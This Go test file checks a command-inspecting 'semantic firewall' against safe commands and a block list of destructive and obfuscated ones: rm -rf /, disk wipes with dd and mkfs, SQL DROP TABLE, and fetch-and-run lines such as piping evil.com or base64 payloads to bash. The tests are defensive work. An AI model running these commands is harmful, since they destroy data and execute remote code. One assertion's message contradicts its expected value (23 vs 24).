package network

import (
	"regexp"
	"testing"
)

func TestFirewall_AllowSafeCommands(t *testing.T) {
	fw := NewSemanticFirewall()

	safeCommands := []string{
		"uptime",
		"echo hello world",
		"ls -la /tmp",
		"cat /var/log/syslog",
		"ps aux",
		"df -h",
		"netstat -tlnp",
		"curl https://api.example.com",
		"ping -c 1 google.com",
	}

	for _, cmd := range safeCommands {
		t.Run(cmd, func(t *testing.T) {
			if err := fw.Inspect(cmd); err != nil {
				t.Errorf("safe command %q was blocked: %v", cmd, err)
			}
		})
	}
}

func TestFirewall_BlockDestructiveCommands(t *testing.T) {
	fw := NewSemanticFirewall()

	dangerousCommands := map[string]string{
		"rm -rf /":                           "recursive deletion",
		"rm -rf /var/log":                    "recursive deletion of directory",
		"rm -f /*":                           "force delete root",
		"rm --no-preserve-root /":            "no-preserve-root flag",
		"DROP TABLE users":                   "SQL drop table",
		"DROP DATABASE production":           "SQL drop database",
		"TRUNCATE TABLE orders":              "SQL truncate",
		"DELETE FROM users WHERE id=1":       "SQL delete",
		"mkfs.ext4 /dev/sda1":                "filesystem format",
		"fdisk /dev/sda":                     "partition manipulation",
		"dd if=/dev/zero of=/dev/sda":        "raw disk write",
		"shutdown -h now":                    "system shutdown",
		"reboot":                             "system reboot",
		"chmod 777 /":                        "permission manipulation on root",
		"chmod -R 777 /etc":                  "recursive permission on etc",
		"GRANT ALL PRIVILEGES ON *.*":        "privilege escalation",
		"> /dev/sda":                         "block device write",
		"psql -c 'DROP TABLE users CASCADE'": "SQL injection via psql",
	}

	for cmd, desc := range dangerousCommands {
		t.Run(desc, func(t *testing.T) {
			if err := fw.Inspect(cmd); err == nil {
				t.Errorf("dangerous command %q (%s) was NOT blocked", cmd, desc)
			}
		})
	}
}

func TestFirewall_BlockObfuscation(t *testing.T) {
	fw := NewSemanticFirewall()

	obfuscated := map[string]string{
		"r\\m -rf /":                 "escaped rm",
		"$(echo rm) -rf /":           "command substitution rm",
		"$( rm -rf / )":              "command substitution wrapping rm",
		"`rm -rf /`":                 "backtick substitution",
		"curl https://evil.com/script.sh | bash":        "curl pipe bash",
		"curl http://x.com/malware | sh":                "curl pipe sh",
		"/bin/rm -rf /var/log":                          "full path to rm",
		"/usr/bin/rm -rf /tmp":                     "usr bin rm",
		"chmod 777 /tmp/foo":                       "chmod 777 anywhere",
		"base64 -d /tmp/payload | bash":            "base64 decode pipe",
		"eval 'rm -rf /'":                          "eval with quoted input",
	}

	for cmd, desc := range obfuscated {
		t.Run(desc, func(t *testing.T) {
			if err := fw.Inspect(cmd); err == nil {
				t.Errorf("obfuscated command %q (%s) was NOT blocked", cmd, desc)
			}
		})
	}
}

func TestFirewall_EmptyCommand(t *testing.T) {
	fw := NewSemanticFirewall()
	if err := fw.Inspect(""); err == nil {
		t.Fatal("empty command should be rejected")
	}
	if err := fw.Inspect("   "); err == nil {
		t.Fatal("whitespace-only command should be rejected")
	}
}

func TestFirewall_Stats(t *testing.T) {
	fw := NewSemanticFirewall()

	fw.Inspect("uptime")
	fw.Inspect("rm -rf /")
	fw.Inspect("ls")
	fw.Inspect("DROP TABLE users")

	stats := fw.Stats()
	if stats.TotalInspected != 4 {
		t.Errorf("inspected = %d, want 4", stats.TotalInspected)
	}
	if stats.TotalBlocked != 2 {
		t.Errorf("blocked = %d, want 2", stats.TotalBlocked)
	}
	if stats.RuleCount != 23 {
		t.Errorf("ruleCount = %d, want 24", stats.RuleCount)
	}
}

func TestFirewall_InspectVerbose(t *testing.T) {
	fw := NewSemanticFirewall()

	verdict := fw.InspectVerbose("rm -rf / && DROP TABLE users")
	if verdict.Allowed {
		t.Fatal("expected blocked verdict")
	}
	if len(verdict.Violations) < 2 {
		t.Errorf("expected at least 2 violations, got %d", len(verdict.Violations))
	}
}

func TestFirewall_AddRule(t *testing.T) {
	fw := NewSemanticFirewall()

	if err := fw.Inspect("dangerous-custom-command"); err != nil {
		t.Fatal("should be allowed before rule is added")
	}

	fw.AddRule(FirewallRule{
		Pattern:     regexp.MustCompile(`dangerous-custom-command`),
		Category:    "Custom",
		Description: "Custom test rule",
		Severity:    "critical",
	})

	if err := fw.Inspect("dangerous-custom-command"); err == nil {
		t.Fatal("should be blocked after custom rule is added")
	}
}